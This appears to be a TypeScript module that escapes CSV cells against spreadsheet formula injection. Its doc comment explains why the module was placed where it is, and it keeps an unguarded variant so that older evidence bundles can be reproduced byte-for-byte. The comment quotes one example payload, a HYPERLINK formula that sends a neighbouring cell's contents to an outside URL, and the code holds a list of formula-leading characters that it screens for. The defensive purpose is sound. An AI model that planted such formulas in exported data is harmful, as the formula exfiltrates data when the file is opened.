/**
 * One CSV cell, safe to open in a spreadsheet.
 *
 * ## Why it is here rather than in the module that first needed it
 *
 * Phase 15 wrote this in `reporting/domain/report-writers.ts` and, in the same commit, recorded a
 * live finding about the *other* CSV writer in the product: `evidenceCsvRow` quotes every field
 * uniformly, its comment claims that is what prevents formula injection, and it is not. Phase 15
 * deliberately did not fix it, because an evidence bundle's bytes are what a signed manifest's
 * digest attests. Phase 18 fixes it, and the module boundary lint forbids `audit/domain/` reaching
 * into `reporting/domain/` — correctly, because an evidence bundle importing a *report writer*
 * would be a dependency on the reporting phase's vocabulary rather than on an escaping rule.
 *
 * The alternatives were both worse. A second copy is six lines that cannot disagree today and can
 * tomorrow, and the day they do, one export neutralises a formula and the other does not — which
 * is precisely the state this file exists to end. Promoting either writer wholesale to core would
 * move a compliance artefact's definition out of the module accountable for it.
 *
 * So the *cell* moved and nothing else did, exactly as `StreamDigest` did in Phase 15. Both
 * writers re-export it, so their call sites and unit tests are unchanged.
 *
 * ## The rule itself
 *
 * A cell beginning `=`, `+`, `-`, `@`, a tab or a carriage return is executed by Excel,
 * LibreOffice and Google Sheets when the file is opened. In this product a cell is a document
 * title, a delete reason or an audit payload — written by a user, some of them by a user who is
 * no longer employed — and the file is opened by a compliance officer on a machine with access to
 * everything. `=HYPERLINK("http://…"&A1,"Click")` in a document title is a working exfiltration of
 * the row beside it.
 *
 * **Quoting does not fix it**, and that is the trap: a CSV reader strips the quotes before the
 * spreadsheet parses the cell, so `"=1+1"` is a formula. The fix is to change the value — a
 * leading apostrophe, which every spreadsheet reads as "the rest of this is text" and displays as
 * neither an apostrophe nor a formula. The apostrophe is prepended *before* quoting, so it is
 * inside the field and travels with the value.
 */

/** The characters a spreadsheet treats as "a formula follows". */
const FORMULA_LEADERS = new Set(['=', '+', '-', '@', '\t', '\r']);

/** RFC 4180 quoting, with the formula neutralised. */
export function csvCell(value: string): string {
  const guarded = FORMULA_LEADERS.has(value.charAt(0)) ? `'${value}` : value;
  return `"${guarded.replaceAll('"', '""')}"`;
}

/**
 * RFC 4180 quoting and nothing else — what Phase 9's evidence CSV has always written.
 *
 * Kept, and reachable by configuration, for one reason: an auditor holding a bundle produced
 * before Phase 18 has a manifest whose artefact digest is over *these* bytes, and re-producing
 * that bundle byte-for-byte is a thing an investigation legitimately needs to do.
 * `evidence-bundle.ts` records which profile a bundle was written under, so the choice is on the
 * artefact rather than in somebody's memory.
 */
export function csvCellUnguarded(value: string): string {
  return `"${value.replaceAll('"', '""')}"`;
}
